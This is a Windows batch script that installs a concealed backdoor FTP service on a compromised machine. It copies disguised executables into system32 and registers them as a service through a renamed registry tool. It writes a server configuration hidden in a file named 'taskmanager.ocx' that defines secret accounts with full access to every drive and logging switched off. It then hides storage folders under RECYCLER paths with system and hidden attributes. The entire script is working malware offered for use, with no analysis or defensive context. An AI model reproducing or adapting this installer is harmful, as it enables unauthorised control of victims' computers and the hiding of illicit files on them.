   @echo off
   copy %systemroot%\system32\wbem\secure32\csrscs.exe %SYSTEMROOT%\system32\csrscs.exe /y
   cd %SYSTEMROOT%\system32\wbem\secure32
   echo user_nick z0r-[pwn3d]-%random% >> 1.dll
   instsrv.exe netsvcs %systemroot%\system32\csrscs.exe
   REGSVCZ.EXE add HKLM\SYSTEM\CurrentControlSet\Services\netsvcs\Parameters\Application="%SYSTEMROOT%\system32\wbem\secure32\netsvcs.exe
   REGSVCZ.EXE add HKLM\SYSTEM\CurrentControlSet\Services\netsvcs\Parameters\AppParameters="%SYSTEMROOT%\system32\wbem\secure32\1.dll
   echo [GLOBAL] >> taskmanager.ocx
   echo Version=5.0.0.4 >> taskmanager.ocx
   echo PacketTimeOut=300 >> taskmanager.ocx
   echo DirCacheEnable=0 >> taskmanager.ocx
   echo SocketInlineOOB=1 >> taskmanager.ocx
   echo SocketKeepAlive=1 >> taskmanager.ocx
   echo SocketRcvBuffer=37376 >> taskmanager.ocx
   echo SocketSndBuffer=37376 >> taskmanager.ocx
   echo CheckAnonPass=1 >> taskmanager.ocx
   echo [DOMAINS] >> taskmanager.ocx
   echo Domain1=0.0.0.0^|^|739^|OwNeR^|1^|0^|0 >> taskmanager.ocx
   echo Domain2=0.0.0.0^|^|81^|WeiRd^|2^|0^|0 >> taskmanager.ocx
   echo Domain3=0.0.0.0^|^|1022^|CuRRy^|3^|0^|0 >> taskmanager.ocx
   echo Domain4=0.0.0.0^|^|5191^|Security^|4^|0^|0 >> taskmanager.ocx
   echo [Domain1] >> taskmanager.ocx
   echo ReplyHello=Im Going to Hack You >> taskmanager.ocx
   echo ReplyHelp=Fuck You Asshole >> taskmanager.ocx
   echo ReplyNoAnon=Packeting Your IP >> taskmanager.ocx
   echo ReplyNoCredit=Hacking You >> taskmanager.ocx
   echo ReplySYST=Hacking You >> taskmanager.ocx
   echo ReplyTooMany=Packeting All IPs Now >> taskmanager.ocx
   echo ReplyDown=Hacking You ATM >> taskmanager.ocx
   echo ReplyOffline=Enough Die Now >> taskmanager.ocx
   echo LogSystemMes=0 >> taskmanager.ocx
   echo LogSecurityMes=0 >> taskmanager.ocx
   echo LogGETs=0 >> taskmanager.ocx
   echo LogPUTs=0 >> taskmanager.ocx
   echo LogFileSystemMes=0 >> taskmanager.ocx
   echo LogFileSecurityMes=0 >> taskmanager.ocx
   echo LogFileGETs=0 >> taskmanager.ocx
   echo LogFilePUTs=0 >> taskmanager.ocx
   echo User1=gf16l4de^|1^|0 >> taskmanager.ocx
   echo SignOn=%SYSTEMROOT%\system32\wbem\secure32\lxmm.hlp >> taskmanager.ocx
   echo SignOff=%SYSTEMROOT%\system32\wbem\secure32\lx.hlp >> taskmanager.ocx
   echo DirChangeMesFile=%SYSTEMROOT%\system32\wbem\secure32\lxm.hlp >> taskmanager.ocx
   echo [USER=gf16l4de^|1] >> taskmanager.ocx
   echo Password=kfA8E9BBD5408D0E02D307CBE1CEFAB906 >> taskmanager.ocx
   echo HomeDir=c:\ >> taskmanager.ocx
   echo SignOn=%SYSTEMROOT%\system32\wbem\secure32\lxmm.hlp >> taskmanager.ocx
   echo SignOff=%SYSTEMROOT%\system32\wbem\secure32\lx.hlp >> taskmanager.ocx
   echo DirChangeMesFile=%SYSTEMROOT%\system32\wbem\secure32\lxm.hlp >> taskmanager.ocx
   echo AlwaysAllowLogin=1 >> taskmanager.ocx
   echo TimeOut=600 >> taskmanager.ocx
   echo Maintenance=System >> taskmanager.ocx
   echo Access1=C:\^|RWAMELCDP >> taskmanager.ocx
   echo Access2=D:\^|RWAMELCDP >> taskmanager.ocx
   echo Access3=E:\^|RWAMELCDP >> taskmanager.ocx
   echo Access4=F:\^|RWAMELCDP >> taskmanager.ocx
   echo Access5=G:\^|RWAMELCDP >> taskmanager.ocx
   echo Access6=H:\^|RWAMELCDP >> taskmanager.ocx
   echo Access7=I:\^|RWAMELCDP >> taskmanager.ocx
   echo Access8=J:\^|RWAMELCDP >> taskmanager.ocx
   echo Access9=K:\^|RWAMELCDP >> taskmanager.ocx
   echo Access10=L:\^|RWAMELCDP >> taskmanager.ocx
   echo Access11=M:\^|RWAMELCDP >> taskmanager.ocx
   echo Access12=N:\^|RWAMELCDP >> taskmanager.ocx
   echo Access13=O:\^|RWAMELCDP >> taskmanager.ocx
   echo Access14=P:\^|RWAMELCDP >> taskmanager.ocx
   echo Access15=Q:\^|RWAMELCDP >> taskmanager.ocx
   echo Access16=R:\^|RWAMELCDP >> taskmanager.ocx
   echo Access17=S:\^|RWAMELCDP >> taskmanager.ocx
   echo Access18=T:\^|RWAMELCDP >> taskmanager.ocx
   echo Access19=U:\^|RWAMELCDP >> taskmanager.ocx
   echo Access20=V:\^|RWAMELCDP >> taskmanager.ocx
   echo Access21=W:\^|RWAMELCDP >> taskmanager.ocx
   echo Access22=X:\^|RWAMELCDP >> taskmanager.ocx
   echo Access23=Y:\^|RWAMELCDP >> taskmanager.ocx
   echo Access24=Z:\^|RWAMELCDP >> taskmanager.ocx
   echo SKEYValues= >> taskmanager.ocx
   echo [Domain2] >> taskmanager.ocx
   echo ReplyHello=Im Going to Hack You >> taskmanager.ocx
   echo ReplyHelp=Fuck You Asshole >> taskmanager.ocx
   echo ReplyNoAnon=Packeting Your IP >> taskmanager.ocx
   echo ReplyNoCredit=Hacking You >> taskmanager.ocx
   echo ReplySYST=Hacking You >> taskmanager.ocx
   echo ReplyTooMany=Packeting All IPs Now >> taskmanager.ocx
   echo ReplyDown=Hacking You ATM >> taskmanager.ocx
   echo ReplyOffline=Enough Die Now >> taskmanager.ocx
   echo LogSystemMes=0 >> taskmanager.ocx
   echo LogSecurityMes=0 >> taskmanager.ocx
   echo LogGETs=0 >> taskmanager.ocx
   echo LogPUTs=0 >> taskmanager.ocx
   echo LogFileSystemMes=0 >> taskmanager.ocx
   echo LogFileSecurityMes=0 >> taskmanager.ocx
   echo LogFileGETs=0 >> taskmanager.ocx
   echo LogFilePUTs=0 >> taskmanager.ocx
   echo User1=userbin^|1^|0 >> taskmanager.ocx
   echo SignOn=%SYSTEMROOT%\system32\wbem\secure32\lxmm.hlp >> taskmanager.ocx
   echo SignOff=%SYSTEMROOT%\system32\wbem\secure32\lx.hlp >> taskmanager.ocx
   echo DirChangeMesFile=%SYSTEMROOT%\system32\wbem\secure32\lxm.hlp >> taskmanager.ocx
   echo [USER=userbin^|2] >> taskmanager.ocx
   echo Password=ia1BBD7CADA5E5FC3A4205E17758E1B861 >> taskmanager.ocx
   echo HomeDir=c:\ >> taskmanager.ocx
   echo SignOn=%SYSTEMROOT%\system32\wbem\secure32\lxmm.hlp >> taskmanager.ocx
   echo SignOff=%SYSTEMROOT%\system32\wbem\secure32\lx.hlp >> taskmanager.ocx
   echo DirChangeMesFile=%SYSTEMROOT%\system32\wbem\secure32\lxm.hlp >> taskmanager.ocx
   echo TimeOut=600 >> taskmanager.ocx
   echo Access1=C:\^|RWAMELCDP >> taskmanager.ocx
   echo Access2=D:\^|RWAMELCDP >> taskmanager.ocx
   echo Access3=E:\^|RWAMELCDP >> taskmanager.ocx
   echo Access4=F:\^|RWAMELCDP >> taskmanager.ocx
   echo Access5=G:\^|RWAMELCDP >> taskmanager.ocx
   echo Access6=H:\^|RWAMELCDP >> taskmanager.ocx
   echo Access7=I:\^|RWAMELCDP >> taskmanager.ocx
   echo Access8=J:\^|RWAMELCDP >> taskmanager.ocx
   echo Access9=K:\^|RWAMELCDP >> taskmanager.ocx
   echo Access10=L:\^|RWAMELCDP >> taskmanager.ocx
   echo Access11=M:\^|RWAMELCDP >> taskmanager.ocx
   echo Access12=N:\^|RWAMELCDP >> taskmanager.ocx
   echo Access13=O:\^|RWAMELCDP >> taskmanager.ocx
   echo Access14=P:\^|RWAMELCDP >> taskmanager.ocx
   echo Access15=Q:\^|RWAMELCDP >> taskmanager.ocx
   echo Access16=R:\^|RWAMELCDP >> taskmanager.ocx
   echo Access17=S:\^|RWAMELCDP >> taskmanager.ocx
   echo Access18=T:\^|RWAMELCDP >> taskmanager.ocx
   echo Access19=U:\^|RWAMELCDP >> taskmanager.ocx
   echo Access20=V:\^|RWAMELCDP >> taskmanager.ocx
   echo Access21=W:\^|RWAMELCDP >> taskmanager.ocx
   echo Access22=X:\^|RWAMELCDP >> taskmanager.ocx
   echo Access23=Y:\^|RWAMELCDP >> taskmanager.ocx
   echo Access24=Z:\^|RWAMELCDP >> taskmanager.ocx
   echo SKEYValues= >> taskmanager.ocx
   echo [Domain3] >> taskmanager.ocx
   echo ReplyHello=Im Going to Hack You >> taskmanager.ocx
   echo ReplyHelp=Fuck You Asshole >> taskmanager.ocx
   echo ReplyNoAnon=Packeting Your IP >> taskmanager.ocx
   echo ReplyNoCredit=Hacking You >> taskmanager.ocx
   echo ReplySYST=Hacking You >> taskmanager.ocx
   echo ReplyTooMany=Packeting All IPs Now >> taskmanager.ocx
   echo ReplyDown=Hacking You ATM >> taskmanager.ocx
   echo ReplyOffline=Enough Die Now >> taskmanager.ocx
   echo LogSystemMes=0 >> taskmanager.ocx
   echo LogSecurityMes=0 >> taskmanager.ocx
   echo LogGETs=0 >> taskmanager.ocx
   echo LogPUTs=0 >> taskmanager.ocx
   echo LogFileSystemMes=0 >> taskmanager.ocx
   echo LogFileSecurityMes=0 >> taskmanager.ocx
   echo LogFileGETs=0 >> taskmanager.ocx
   echo LogFilePUTs=0 >> taskmanager.ocx
   echo User1=imacurry^|1^|0 >> taskmanager.ocx
   echo SignOn=%SYSTEMROOT%\system32\wbem\secure32\lxmm.hlp >> taskmanager.ocx
   echo SignOff=%SYSTEMROOT%\system32\wbem\secure32\lx.hlp >> taskmanager.ocx
   echo DirChangeMesFile=%SYSTEMROOT%\system32\wbem\secure32\lxm.hlp >> taskmanager.ocx
   echo [USER=imacurry^|3] >> taskmanager.ocx
   echo Password=ho2E3434147577EE86767840967CEDCD2B >> taskmanager.ocx
   echo HomeDir=C:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\Dc1 >> taskmanager.ocx
   echo SignOn=%SYSTEMROOT%\system32\wbem\secure32\lxmm.hlp >> taskmanager.ocx
   echo SignOff=%SYSTEMROOT%\system32\wbem\secure32\lx.hlp >> taskmanager.ocx
   echo DirChangeMesFile=%SYSTEMROOT%\system32\wbem\secure32\lxm.hlp >> taskmanager.ocx
   echo AlwaysAllowLogin=1 >> taskmanager.ocx
   echo RelPaths=6 >> taskmanager.ocx
   echo TimeOut=600 >> taskmanager.ocx
   echo Access1=C:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\Dc1\debug^|RWAMELCDP >> taskmanager.ocx
   echo Access2=D:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\Dc1\debug^|RWAMELCDP >> taskmanager.ocx
   echo Access3=E:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\Dc1\debug^|RWAMELCDP >> taskmanager.ocx
   echo Access4=F:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\Dc1\debug^|RWAMELCDP >> taskmanager.ocx
   echo Access5=G:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\Dc1\debug^|RWAMELCDP >> taskmanager.ocx
   echo Access6=H:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\Dc1\debug^|RWAMELCDP >> taskmanager.ocx
   echo Access7=I:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\Dc1\debug^|RWAMELCDP >> taskmanager.ocx
   echo Access8=J:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\Dc1\debug^|RWAMELCDP >> taskmanager.ocx
   echo Access9=K:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\Dc1\debug^|RWAMELCDP >> taskmanager.ocx
   echo SKEYValues= >> taskmanager.ocx
   echo [Domain4] >> taskmanager.ocx
   echo ReplyHello=Im Going to Hack You >> taskmanager.ocx
   echo ReplyHelp=Fuck You Asshole >> taskmanager.ocx
   echo ReplyNoAnon=Packeting Your IP >> taskmanager.ocx
   echo ReplyNoCredit=Hacking You >> taskmanager.ocx
   echo ReplySYST=Hacking You >> taskmanager.ocx
   echo ReplyTooMany=Packeting All IPs Now >> taskmanager.ocx
   echo ReplyDown=Hacking You ATM >> taskmanager.ocx
   echo ReplyOffline=Enough Die Now >> taskmanager.ocx
   echo LogSystemMes=0 >> taskmanager.ocx
   echo LogSecurityMes=0 >> taskmanager.ocx
   echo LogGETs=0 >> taskmanager.ocx
   echo LogPUTs=0 >> taskmanager.ocx
   echo LogFileSystemMes=0 >> taskmanager.ocx
   echo LogFileSecurityMes=0 >> taskmanager.ocx
   echo LogFileGETs=0 >> taskmanager.ocx
   echo LogFilePUTs=0 >> taskmanager.ocx
   echo User1=h3lpm3h^|1^|0 >> taskmanager.ocx
   echo SignOn=%SYSTEMROOT%\system32\wbem\secure32\lxmm.hlp >> taskmanager.ocx
   echo SignOff=%SYSTEMROOT%\system32\wbem\secure32\lx.hlp >> taskmanager.ocx
   echo DirChangeMesFile=%SYSTEMROOT%\system32\wbem\secure32\lxm.hlp >> taskmanager.ocx
   echo [USER=h3lpm3h^|4] >> taskmanager.ocx
   echo Password=at9F117812CEFDBFE6EB06B985EA2094EB >> taskmanager.ocx
   echo HomeDir=c:\ >> taskmanager.ocx
   echo SignOn=%SYSTEMROOT%\system32\wbem\secure32\lxmm.hlp >> taskmanager.ocx
   echo SignOff=%SYSTEMROOT%\system32\wbem\secure32\lx.hlp >> taskmanager.ocx
   echo DirChangeMesFile=%SYSTEMROOT%\system32\wbem\secure32\lxm.hlp >> taskmanager.ocx
   echo AlwaysAllowLogin=1 >> taskmanager.ocx
   echo TimeOut=600 >> taskmanager.ocx
   echo Maintenance=System >> taskmanager.ocx
   echo Access1=C:\^|RWAMELCDP >> taskmanager.ocx
   echo Access2=D:\^|RWAMELCDP >> taskmanager.ocx
   echo Access3=E:\^|RWAMELCDP >> taskmanager.ocx
   echo Access4=F:\^|RWAMELCDP >> taskmanager.ocx
   echo Access5=G:\^|RWAMELCDP >> taskmanager.ocx
   echo Access6=H:\^|RWAMELCDP >> taskmanager.ocx
   echo Access7=I:\^|RWAMELCDP >> taskmanager.ocx
   echo Access8=J:\^|RWAMELCDP >> taskmanager.ocx
   echo Access9=K:\^|RWAMELCDP >> taskmanager.ocx
   echo Access10=L:\^|RWAMELCDP >> taskmanager.ocx
   echo Access11=M:\^|RWAMELCDP >> taskmanager.ocx
   echo Access12=N:\^|RWAMELCDP >> taskmanager.ocx
   echo Access13=O:\^|RWAMELCDP >> taskmanager.ocx
   echo Access14=P:\^|RWAMELCDP >> taskmanager.ocx
   echo Access15=Q:\^|RWAMELCDP >> taskmanager.ocx
   echo Access16=R:\^|RWAMELCDP >> taskmanager.ocx
   echo Access17=S:\^|RWAMELCDP >> taskmanager.ocx
   echo Access18=T:\^|RWAMELCDP >> taskmanager.ocx
   echo Access19=U:\^|RWAMELCDP >> taskmanager.ocx
   echo Access20=V:\^|RWAMELCDP >> taskmanager.ocx
   echo Access21=W:\^|RWAMELCDP >> taskmanager.ocx
   echo Access22=X:\^|RWAMELCDP >> taskmanager.ocx
   echo Access23=Y:\^|RWAMELCDP >> taskmanager.ocx
   echo Access24=Z:\^|RWAMELCDP >> taskmanager.ocx
   echo SKEYValues= >> taskmanager.ocx
   taskmgr.exe /i /h
   net start tskhlp
   net start netsvcs
   mkdir D:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug
   mkdir E:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug
   mkdir F:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug
   mkdir G:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug
   mkdir C:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug\income
   mkdir D:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug\income
   mkdir E:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug\income
   mkdir G:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug\income
   mkdir G:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug\income
   mkdir c:\$temp
   mkdir c:\$temp2
   md c:\$temp
   md c:\$temp2
   attrib +s +h +r +a C:\$temp
   attrib +s +h +r +a C:\$temp2
   attrib +s +h +r +a %systemroot%\system32\wbem\secure32
   attrib +s +h +r +a C:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug\income
   attrib +s +h +r +a C:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug
   attrib +s +h +r +a C:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1
   attrib +s +h +r +a C:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035
   attrib +s +h +r +a C:\RECYCLER
   attrib +s +h +r +a D:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug\income
   attrib +s +h +r +a D:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug
   attrib +s +h +r +a D:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1
   attrib +s +h +r +a D:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035
   attrib +s +h +r +a D:\RECYCLER
   attrib +s +h +r +a E:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug\income
   attrib +s +h +r +a E:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug
   attrib +s +h +r +a E:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1
   attrib +s +h +r +a E:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035
   attrib +s +h +r +a E:\RECYCLER
   attrib +s +h +r +a F:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug\income
   attrib +s +h +r +a F:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug
   attrib +s +h +r +a F:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1
   attrib +s +h +r +a F:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035
   attrib +s +h +r +a F:\RECYCLER
   attrib +s +h +r +a G:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug\income
   attrib +s +h +r +a G:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1\debug
   attrib +s +h +r +a G:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\dc1
   attrib +s +h +r +a G:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035
   attrib +s +h +r +a G:\RECYCLER
   uptime.exe /s >> SystemMon.hlp
   move SystemMon.hlp C:\RECYCLER\S-1-5-21-145479639-98328975-939974541-1035\SystemMon.hlp
   secure32.exe
   windows -app
   windows -sys
   windows -sec
   bleh.bat
   :exit
